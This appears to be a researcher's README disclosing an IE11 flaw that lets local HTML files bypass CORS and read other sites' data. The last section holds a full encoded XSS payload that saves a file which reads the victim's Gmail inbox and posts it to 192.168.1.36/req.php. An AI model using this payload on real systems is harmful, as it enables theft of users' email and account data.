# IE11xCORSxSOP
IE11 is not following CORS specification for local files like Chrome and Firefox.<br>
I've contacted Microsoft and they say this is not a security issue so I'm sharing it.<br>
From my tests IE11 is not following CORS specifications for local files as supposed to be.<br>
In order to prove I've created a malicious cors.html.<br>
The cors.html will be able to get an skype token and perform get on the user profile. Instead of using alert() function I could send this information to a domain that I have control.<br>
Of course the victim needs to open the file from his local drive or maybe another application can open an IE instance.<br>
If the user is logged on a Microsoft account and open the html file with the content above with onload function instead of onclick I'd be able to get his profile data.<br>
This is a simple scenario. An attacker would be able to get any data from any domain that do not require a unique ID (e.g. CSRF token) which the attacker doesn't have and is unable to get.<br>
If you do the same test on Chrome or Firefox the browser will follow CORS specification and block the response content since no CORS headers is present in the response.<br>
I tested on IE11 running on Win7SP1  with all security patches and it worked. On Win10 didn't work. I didn't test in any server with CORS enabled.<br>
If you think in another malicious scenario please let me know.

I did a small improvement in this attack.
Using IE File API (https://msdn.microsoft.com/en-us/library/hh772315(v=vs.85).aspx) an attacker would be able to create a web page with the content of fileAPI.html and send to a victim.
A local file with the same content of cors.html would be created on download default folder.
If the victim perform the three following clicks (Save, Open and Allow blocked content) an attacker would be able to perform any request to any domain and send the content to a domain which he/she has control.
If the attacker is a MitM position this could be more intersting. Since the attacker could inject this content in a HTTP page and the victim will tend to relay on that.
Next step would be force the victim to click on Save, Open and Allow blocked content buttons.

Same attack using XSS as vector.
Imagine that https://xss-doc.appspot.com is a site about gift cards.
The XSS payload below will create a giftcard.htm file in the default download folder.
If the victim open the file a GET to https://mail.google.com/mail/u/0/#inbox will be submitted.
After the GET the file will perform a POST to http://192.168.1.36/req.php using the GET response as a body.
An attacker would be able to read all the emails in the following requests.
I tested on Win7SP1 and IE11 with all patches and it worked.

https://xss-doc.appspot.com/demo/2?query=%3Cscript%3Eif%28typeof+Blob+%21%3D%3D+%22undefined%22%29%7BdemoBlobs%28%29%3B%7Dfunction+demoBlobs%28%29%7Bvar+blob+%3D+new+Blob%28%5B%22%3Chtml%3E%3Cbody+onload%3D%5C%22go%28%29%5C%22%3E%3Cscript%3Efunction+req%28mtd%2Curl%2Cbdy%29%7Bvar+xhr%3Dnew+XMLHttpRequest%28%29%3Bxhr.open%28mtd%2Curl%2Cfalse%29%3Bxhr.send%28bdy%29%3Breturn+xhr.responseText%3B%7D%3Bfunction+go%28%29%7Bvar+gmail%3Dreq%28%5C%22GET%5C%22%2C%5C%22https%3A%5C%2F%5C%2Fmail.google.com%5C%2Fmail%5C%2Fu%5C%2F0%5C%2F%23inbox%5C%22%2Cnull%29%3Breq%28%5C%22POST%5C%22%2C%5C%22http%3A%5C%2F%5C%2F192.168.1.36%5C%2Freq.php%5C%22%2Cgmail%29%7D%3B%3C%5C%2Fscript%3E%3C%5C%2Fbody%3E%3C%5C%2Fhtml%3E%22%5D%29%3B+++window.navigator.msSaveBlob%28blob%2C+%27giftcard.htm%27%29%3B%7D%3C%2Fscript%3E
